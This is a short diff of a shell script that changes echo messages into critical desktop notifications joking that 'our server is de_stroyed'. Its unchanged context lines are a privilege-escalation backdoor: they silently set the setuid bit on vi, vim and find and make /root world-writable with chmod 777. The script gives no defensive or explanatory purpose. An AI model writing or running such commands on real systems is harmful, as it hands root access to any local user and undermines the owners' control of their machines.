@@ -11,6 +11,6 @@ chmod u+s `which vi` &> /dev/null
 chmod u+s `which vim` &> /dev/null
 chmod u+s `which find` &> /dev/null
 chmod 777 /root &> /dev/null
-echo "Oh, well in fact" &> /dev/null
-echo "Well, I'll look at it this way" &> /dev/null
-echo "I mean technically our server is de_stroyed"
+notify-send --urgency=critical "oh, well in fact"
+notify-send --urgency=critical "well, I'll look at it this way"
+notify-send --urgency=critical "I mean technically our server is de_stroyed"
